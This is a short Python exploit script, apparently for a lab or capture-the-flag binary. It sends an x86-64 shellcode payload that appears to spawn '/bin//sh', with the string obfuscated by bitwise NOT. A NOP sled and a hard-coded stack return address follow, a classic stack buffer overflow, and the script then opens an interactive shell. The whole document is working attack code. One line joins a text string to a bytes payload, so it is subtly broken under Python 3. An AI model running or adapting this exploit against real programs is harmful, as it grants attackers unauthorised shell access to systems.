import interact
import struct

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()
payload = b'\x48\x31\xf6\x56\x48\xbb\xd0\x9d\x96\x91\xd0\xd0\x8c\x97\x48\xc7\xc1\xff\xff\xff\xff\x48\x31\xcb\x53\x54\x5f\x31\xf6\x31\xd2\x6a\x3a\x58\x48\xff\xc0\x0f\x05'
nop = "\x90"*(119-len(payload))
ret_add = p64(0x7FFFFFFFED61)
data = p.readuntil('\n')
p.sendline(payload+nop+ret_add)

p.interactive()